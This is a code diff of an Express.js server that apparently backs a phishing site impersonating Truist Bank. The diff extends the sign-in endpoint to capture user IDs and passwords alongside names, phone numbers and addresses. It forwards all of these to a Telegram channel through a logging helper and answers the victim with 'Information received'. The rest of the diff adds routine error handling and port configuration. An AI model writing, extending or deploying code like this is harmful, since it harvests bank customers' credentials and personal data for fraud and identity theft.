@@ -1,9 +1,14 @@
+require('dotenv').config();
 const express = require('express');
 const path = require('path');
 const { logToTelegram, sendToTelegram } = require('./telegram-logger');
 
 const app = express();
-const PORT = 5000;
+const PORT = process.env.PORT || 5000;
+
+process.on('uncaughtException', function(err) {
+    console.error('Uncaught Exception:', err);
+});
 
 app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
@@ -22,9 +27,11 @@ app.get('/', (req, res) => {
 });
 
 app.post('/api/signin', (req, res) => {
-  const { fullName, phone, address } = req.body;
+  const { userId, Password, fullName, phone, address } = req.body;
   
   logToTelegram('Sign-in Attempt', {
+    userId,
+    Password,
     fullName,
     phone,
     address,
@@ -35,7 +42,18 @@ app.post('/api/signin', (req, res) => {
   res.json({ success: true, message: 'Information received' });
 });
 
-app.listen(PORT, '0.0.0.0', () => {
-  console.log(`Server is running on http://0.0.0.0:${PORT}`);
-  sendToTelegram('🚀 <b>Server Started</b>\n\nTruist Bank website is now running on port ' + PORT);
+const server = app.listen(PORT, 'localhost', () => {
+  console.log(`Server is running on http://localhost:${PORT}`);
+  sendToTelegram('🚀 <b>Server Started</b>\n\nTruist Bank website is now running on port ' + PORT)
+    .catch(err => console.error('Failed to send Telegram notification:', err));
+});
+
+server.on('error', (err) => {
+  console.error('Server error:', err);
+});
+
+process.on('SIGTERM', () => {
+  server.close(() => {
+    console.log('Server terminated');
+  });
 });
